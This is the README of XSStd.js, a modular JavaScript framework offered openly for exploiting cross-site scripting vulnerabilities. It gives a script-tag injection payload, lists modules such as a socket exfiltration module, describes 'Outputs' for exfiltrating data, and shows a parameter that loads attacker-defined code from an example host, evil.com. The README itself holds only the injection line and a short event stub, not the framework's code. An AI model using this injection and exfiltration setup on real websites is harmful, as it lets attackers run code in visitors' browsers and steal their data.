XSStd.js
=========

XSStd.js is a modular JS framework for exploiting XSS vulnerabilities.

Injecting the XSStd.js file automatically includes three handy JS classes — jQuery, underscore, and backbone. Additionally, you can pass in desired "modules" to accomplish specific tasks, along with a path to a user-definted JS file where you give XSStd.js (and requested modules) parameters necessary to carry out attacks.

____

Usage
---------

Injection:

```javascript
<script src="http://path.to/xsstd.js?m=&u="></script>
```

Parameters:
* **m**: Pipe-delimited list of modules to load upon initial execution. ex: socket.exfil|form
* **u**: URL to user-defined JS. ex: http://evil.com/evil.js

Structures
--------
* **Attacks** – Various categories of actions you can perform.
* **Outputs** – Various methods for exfiltrating data.

'ready'
--------

XSStd.js fires a 'ready' event when all external modules/scripts are finished loading:

```javascript
xsstd.on('ready', function(){
	// ready to go!
	// the main XSStd.js object can be referenced by using '_x' 
});
```

**If you have any questions, find me on [twitter]**


[twitter]:http://twitter.com/evanbooth
